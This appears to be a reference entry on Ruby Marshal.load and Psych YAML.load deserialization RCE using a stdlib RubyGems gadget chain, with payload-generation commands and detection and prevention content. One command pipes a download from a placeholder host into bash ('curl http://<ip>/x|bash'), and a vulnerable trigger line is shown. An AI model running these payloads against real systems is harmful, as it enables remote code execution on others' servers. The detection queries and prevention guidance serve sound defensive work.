name: Ruby Marshal.load Universal Deserialization RCE
description: Ruby's Marshal.load reconstructs arbitrary objects and, via a universal gadget chain that abuses Gem::Requirement / Gem::Installer / Gem::StubSpecification present in the standard library, reaches code execution without any third-party dependency. A single public gadget (the Universal Deserialisation Gadget) turns any Marshal.load of attacker data into RCE; YAML.load (Psych) is similarly abusable.
notes:
=== IDENTIFY A RUBY MARSHAL SINK ===
  # Marshal.load / Marshal.restore on request data, cookies, caches (Rails Marshal cache store),
  # ActiveSupport::MessageVerifier blobs with a known/leaked secret, or YAML.load (Psych).
  # Raw Marshal streams begin with bytes 04 08 (version 4.8).

=== UNIVERSAL GADGET (no gems required) ===
  # The public universal_rce.rb builds a Marshal payload using only stdlib classes
  # (Gem::Requirement -> Gem::DependencyList / Gem::Source::Git -> Kernel#system).
  # Generate and deliver:
  ruby universal_rce.rb "id" > payload.bin
  ruby universal_rce.rb "curl http://<ip>/x|bash" | base64 -w0
  # Server-side Marshal.load(payload) fires the chain -> command runs.

=== TRIGGER ===
  # Anything doing:
  Marshal.load(Base64.decode64(params[:data]))   # RCE

=== YAML / PSYCH VARIANT ===
  # Vulnerable: YAML.load(data) on old Psych (pre safe-by-default).
  # Payload uses the same Gem:: gadget serialized as a YAML object graph
  # (e.g. !ruby/object:Gem::Requirement ...). Safe API: YAML.safe_load / Psych.safe_load.

=== RAILS NOTES ===
  # Rails cookie/session RCE historically needed the secret_key_base; the Marshal
  # universal gadget needs only a raw Marshal.load sink, no secret.

=== ALTERNATIVES ===
  Python pickle __reduce__ - see deser-python-pickle
  Node.js node-serialize - see deser-nodejs

recommended.note: Python pickle RCE, a sibling runtime.
Node.js serialization RCE, a sibling runtime.

defense.why_it_works: Marshal.load rebuilds any object and invokes its reconstruction hooks. The universal gadget chains stdlib RubyGems classes so that deserialization alone calls Kernel#system, requiring no third-party gems and no application secret. Psych YAML.load resolves the same object tags.
defense.prerequisites: A Marshal.load (or non-safe YAML.load) on data the attacker controls - request param, cookie, Marshal-backed cache, or message.
defense.impact: Remote code execution as the Ruby/Rails process user.
defense.detection: [MITRE T1190] Inbound blobs beginning with the 04 08 Marshal header or !ruby/object YAML tags; [MITRE T1059] the ruby process spawning sh/bash children.
defense.artifacts: Web/proxy logs with Marshal (\x04\x08) or base64 blobs and !ruby/object tags; EDR/auditd process tree ruby -> sh/bash; unexpected outbound from the app host.
defense.splunk_spl:
index=web (request_body="*!ruby/object*" OR request_body="*\\x04\\x08*")
| table _time, src_ip, uri_path, request_body
defense.sentinel_kql:
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("ruby","ruby.exe")
| where FileName in~ ("sh","bash","dash","cmd.exe")
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
defense.prevention: Never Marshal.load untrusted data; use JSON. Use YAML.safe_load / Psych.safe_load only. For Rails sessions/caches use a signed+encrypted JSON serializer (not :marshal); keep secret_key_base secret; run workers least-privileged.

detections.name: Ruby process spawning a shell (Marshal RCE)
detections.logic:
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("ruby","ruby.exe")
| where FileName in~ ("sh","bash","dash","cmd.exe","curl","wget")
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
detections.false_positives: Rails tasks or tooling that legitimately shell out
detections.tuning: Scope to web/worker tiers; allowlist deploy and cron identities
